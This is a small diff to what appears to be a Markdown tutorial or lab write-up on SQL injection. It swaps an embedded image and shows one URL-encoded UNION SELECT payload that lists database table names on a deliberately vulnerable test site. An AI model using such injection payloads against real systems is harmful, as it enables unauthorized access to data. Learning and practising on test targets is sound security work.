@@ -40,8 +40,8 @@ Namely:
   <li>users</li>
 </ul>
 
+![image](https://github.com/user-attachments/assets/6c9a6a72-51f7-4750-b059-478a924eb65a)
 
-![image](https://github.com/user-attachments/assets/7f021dcf-85e2-4eaa-8274-e93308f29225)
 
 ```
 http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=%27acuart%27
